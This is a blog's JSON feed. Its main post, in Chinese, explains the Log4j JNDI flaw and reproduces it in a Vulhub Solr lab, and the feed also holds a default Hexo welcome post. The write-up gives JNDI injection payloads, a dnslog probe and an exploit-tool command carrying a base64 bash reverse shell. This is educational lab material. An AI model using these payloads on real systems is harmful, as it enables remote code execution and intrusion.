{
    "version": "https://jsonfeed.org/version/1",
    "title": "GoA1's Blog",
    "description": "Personal Learning Blog",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/11/07/log4j%20%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/",
            "url": "http://example.com/2022/11/07/log4j%20%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/",
            "title": "log4j漏洞复现",
            "date_published": "2022-11-07T07:50:46.430Z",
            "content_html": "<h3 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言：</h3>\n<p>JNDI (Java Naming and Directory Interface，JAVA 命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。<br />\n简单理解：有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了<br />\n不同的数据源肯定有不同的查找方式，使用 JNDI 也只是一个上层封装，在它下面也支持很多种具体的数据源。<br />\n<img data-src=\"https://img-blog.csdnimg.cn/7932bb1398374f7d8d3f232989b21874.jpeg#pic_center\" alt=\"LDAP\" /></p>\n<p>LDAP (轻量级目录访问协议)<br />\n 有一个类似于字典的数据源，你可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。</p>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理：</h3>\n<p>假如某一个 Java 程序中，将浏览器的类型记录到了日志中：<br />\nString userAgent = request.getHeader(&quot;User-Agent&quot;);<br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2xvZ2dlci5pbmZv\">logger.info</span>(userAgent);<br />\n 这个 UA 头是外界输入的可被自定义的值，若其中是这样一串字符<br />\n ${jndi:ldap://127.0.0.1/exploit}<br />\n log4j 将会对这行要输出的字符串进行解析。<br />\n首先，它发现了字符串中有 ${}，知道这个里面包裹的内容是要单独处理的。<br />\n进一步解析，发现是 JNDI 扩展内容。<br />\n再进一步，发现是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。<br />\n最后，调用具体复制 LDAP 的模块去请求对应的数据。<br />\n问题就出在这个请求数据可以请求 Java 对象，java 对象一般只存在于内存中，单页可以通过序列化的方式将其存储到文件中，或者通过网络传输。<br />\n更危险的在于：JNDI 还支持一个叫命名引用 (Naming References) 的方式，可以通过远程下载一个 class 文件，然后下载后加载起来构建对象。<br />\n<mark>核心问题：JNDI 可以远程下载 class 文件来构建对象！</mark><br />\n如果远程下载的 url 指向的是一个恶意攻击的服务器，下载的 class 文件里面含有恶意代码，本地服务器就 G 了</p>\n<h3 id=\"漏洞复现\"><a class=\"anchor\" href=\"#漏洞复现\">#</a> 漏洞复现：</h3>\n<p>①kali docker 启动漏洞环境<br />\n cd /home/ayu/vulhub/log4j<br />\ndocker-compose up -d<br />\n②访问 ip:8983web 界面（是个 apache solr 界面</p>\n<p>③bp 抓取刷新界面数据包（需要放两个包，得到 accept 有 json 方法的包<br />\n<img data-src=\"https://img-blog.csdnimg.cn/13d01aaabe924609803818508686c1e3.png#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.4zybrx.dnslog.cn}<br />\n 拼接路径访问 dnslog，状态码为 400 且 dnslog 有访问记录算存在漏洞<br />\n<img data-src=\"https://img-blog.csdnimg.cn/707d555834854b30bda686bad42a555c.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n<img data-src=\"https://img-blog.csdnimg.cn/fe801eb4379846cd9760709f68064321.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n④进一步利用 log4j getshell<br />\nJNDI 工具地址：</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Qtcm4vdnVsQm94L2Jsb2IvbWFpbi9KTkRJLUluamVjdGlvbi1FeHBsb2l0LTEuMC1TTkFQU0hPVC1hbGwuamFy\">https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span></p>\n</blockquote>\n<p>下载工具：</p>\n<blockquote>\n<p>git clone <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Qtcm4vdnVsQm94L2Jsb2IvbWFpbi9KTkRJLUluamVjdGlvbi1FeHBsb2l0LTEuMC1TTkFQU0hPVC1hbGwuamFy\">https://github.com/d-rn/vulBox/blob/main/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span></p>\n</blockquote>\n<blockquote>\n<p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA0LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}&quot; -A &quot;192.168.0.104&quot;<br />\n(base64 的内容为 bash -i&gt;&amp; /dev/tcp/ 要反弹的 ip / 端口号 0&gt;&amp;1，-A “工具所在的 ip”)</p>\n</blockquote>\n<p>工具运行生成如下界面，会有几个紫色字体 payload 生成，直接拼接到 /solr/admin/cores?action=${jndi:payload}<br />\n<img data-src=\"https://img-blog.csdnimg.cn/ee3b59fe874443a7ace554edffd95879.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n Windows10 开启 nc 监听<br />\n<img data-src=\"https://img-blog.csdnimg.cn/c13f4435024a4d4c9816b000a16c47cc.png#pic_center\" alt=\"在这里插入图片描述\" /><br />\n若 一个 payload 没反弹成功就多试两个，成功了 nc 直接获得反弹 shell（且这个反弹 shell 不会乱码，试验过在 kali 端直接执行 bash 反弹过来的 shell 都会乱码，工具有点顶）<br />\n<img data-src=\"https://img-blog.csdnimg.cn/b3949e8b9bb24ec290a72d86409edbad.png#pic_center\" alt=\"在这里插入图片描述\" /><img data-src=\"https://img-blog.csdnimg.cn/a3527963b53b4faabb361ac6a59de50f.png#pic_center\" alt=\"在这里插入图片描述\" /></p>\n<p>感谢 h1dm 师傅的复现文章</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzU2NjA3NzY4L2FydGljbGUvZGV0YWlscy8xMjUxNTQ0MzY=\">https://blog.csdn.net/qq_56607768/article/details/125154436</span></p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/11/02/hello-world/",
            "url": "http://example.com/2022/11/02/hello-world/",
            "title": "Hello World",
            "date_published": "2022-11-02T07:35:22.427Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}